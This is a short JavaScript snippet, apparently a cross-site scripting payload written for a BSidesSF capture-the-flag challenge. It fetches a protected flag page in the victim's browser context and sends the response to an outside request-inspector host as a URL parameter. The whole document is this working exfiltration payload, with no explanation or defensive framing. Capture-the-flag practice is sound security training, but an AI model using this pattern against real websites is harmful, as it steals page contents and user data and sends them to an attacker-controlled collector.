fetch('https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag')
  .then(r => r.text())
  .then(flag => {
      fetch('https://01km6z71vd9qasxg8qxnyp9fqk00-55d2282f5d0bffdeadb8.requestinspector.com?flag=' + encodeURIComponent(flag));
  });
